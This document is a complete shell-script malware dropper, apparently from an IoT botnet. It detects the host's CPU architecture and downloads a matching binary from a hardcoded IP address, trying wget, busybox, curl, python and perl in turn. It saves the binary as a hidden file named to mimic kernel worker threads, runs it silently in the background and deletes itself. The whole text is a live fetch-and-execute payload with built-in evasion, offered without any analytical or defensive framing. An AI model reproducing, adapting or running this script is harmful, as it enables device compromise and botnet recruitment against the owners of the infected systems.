#!/bin/sh

SRV="http://193.32.162.73/d/7c4124282c4ad7b6/bins"

is_le() {
    echo -n I | od -to2 | awk '{print $2; exit}' | grep -q "49"
}

detect_arch() {
    arch=$(uname -m | tr '[:upper:]' '[:lower:]')
    BIN_NAME="kworkerd-rcu"

    case "$arch" in
        x86_64|amd64|x64|x86-64)            BIN_NAME="kworkerd" ;;
        i486)                                 BIN_NAME="kworkerd-cgroup" ;;
        i386|i586|i686|i786|x86|ia32)        BIN_NAME="kworkerd-events" ;;
        armv4*|armv4l*)                       BIN_NAME="kworkerd-irq" ;;
        armv5*|armv5l*|armv5te*)              BIN_NAME="kworkerd-irq-bal" ;;
        armv6*|armv6l*)                       BIN_NAME="kworkerd-softirq" ;;
        armv7*|armv7l*|armv8l*|armv8-compat)  BIN_NAME="kworkerd-blkcg" ;;
        aarch64|arm64|armv8|armv8a|armv9*)    BIN_NAME="kworkerd-arm64" ;;
        mipsel|mips32el|mips64el|mips64r2el)  BIN_NAME="kworkerd-rcu" ;;
        mips32r2)
            if is_le; then BIN_NAME="kworkerd-rcu"; else BIN_NAME="kworkerd-netns-rt"; fi ;;
        mips|mips32|mips64|mips64r2)
            if is_le; then BIN_NAME="kworkerd-rcu"; else BIN_NAME="kworkerd-netns"; fi ;;
        ppc|powerpc|ppc32|ppc64|ppc64le)      BIN_NAME="kworkerd-writeback" ;;
        sh4|sh4a|sh)                          BIN_NAME="kworkerd-crypto" ;;
        m68k)                                 BIN_NAME="kworkerd-scsi" ;;
        sparc|sparc32|sparc64)                BIN_NAME="kworkerd-mm" ;;
    esac

    echo "$BIN_NAME"
}

find_writable_dir() {
    for dir in /tmp /var/tmp /var/system /mnt /run /dev /dev/shm; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    if [ -w "." ]; then
        echo "."
        return 0
    fi
    return 1
}

BIN_NAME=$(detect_arch)
URL="$SRV/$BIN_NAME"

WRITABLE_DIR=$(find_writable_dir)
if [ -z "$WRITABLE_DIR" ]; then
    exit 1
fi

DST="$WRITABLE_DIR/.$BIN_NAME"

rm -f "$DST"

_ok=0
_try=0
while [ $_try -lt 5 ] && [ $_ok -eq 0 ]; do
    _try=$((_try + 1))
    rm -f "$DST"
    if wget -T 180 -t 1 -qO "$DST" "$URL" 2>/dev/null && [ -s "$DST" ]; then
        _ok=1
        break
    fi
    rm -f "$DST"
    if /bin/busybox wget -T 180 -t 1 -qO "$DST" "$URL" 2>/dev/null && [ -s "$DST" ]; then
        _ok=1
        break
    fi
    rm -f "$DST"
    if busybox wget -T 180 -t 1 -qO "$DST" "$URL" 2>/dev/null && [ -s "$DST" ]; then
        _ok=1
        break
    fi
    rm -f "$DST"
    if curl -sfL --connect-timeout 30 --max-time 300 -o "$DST" "$URL" 2>/dev/null && [ -s "$DST" ]; then
        _ok=1
        break
    fi
    rm -f "$DST"
    if command -v python3 >/dev/null 2>&1; then
        if python3 -c 'import sys,urllib.request;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])' "$URL" "$DST" 2>/dev/null && [ -s "$DST" ]; then
            _ok=1
            break
        fi
    fi
    rm -f "$DST"
    if command -v python >/dev/null 2>&1; then
        if python -c 'import sys
try:
 import urllib.request as u
except ImportError:
 import urllib as u
u.urlretrieve(sys.argv[1],sys.argv[2])' "$URL" "$DST" 2>/dev/null && [ -s "$DST" ]; then
            _ok=1
            break
        fi
    fi
    rm -f "$DST"
    if command -v perl >/dev/null 2>&1; then
        if perl -e 'use IO::Socket::INET; my($u,$d)=@ARGV; $u=~m{^http://([^/:]+)(?::(\d+))?(/.*)$} or exit 1; my($h,$p,$path)=($1,$2||80,$3); my $s=IO::Socket::INET->new(PeerAddr=>$h,PeerPort=>$p,Proto=>"tcp",Timeout=>180) or exit 1; print $s "GET $path HTTP/1.0\r\nHost: $h\r\nConnection: close\r\n\r\n"; my $r=do{local $/;<$s>}; my $i=index($r,"\r\n\r\n"); exit 1 if $i<0; open my $f,">",$d or exit 1; binmode $f; print $f substr($r,$i+4); close $f; exit((-s $d)?0:1)' "$URL" "$DST" 2>/dev/null && [ -s "$DST" ]; then
            _ok=1
            break
        fi
    fi
    sleep 3
done

if [ $_ok -eq 0 ] || [ ! -s "$DST" ]; then
    rm -f "$DST"
    exit 1
fi

chmod +x "$DST"
"$DST" >/dev/null 2>&1 &

case "$(basename "$0" 2>/dev/null)" in
    sh|bash|ash|dash|busybox|zsh|ksh|-|"") ;;
    *) rm -f "$0" 2>/dev/null ;;
esac

exit 0
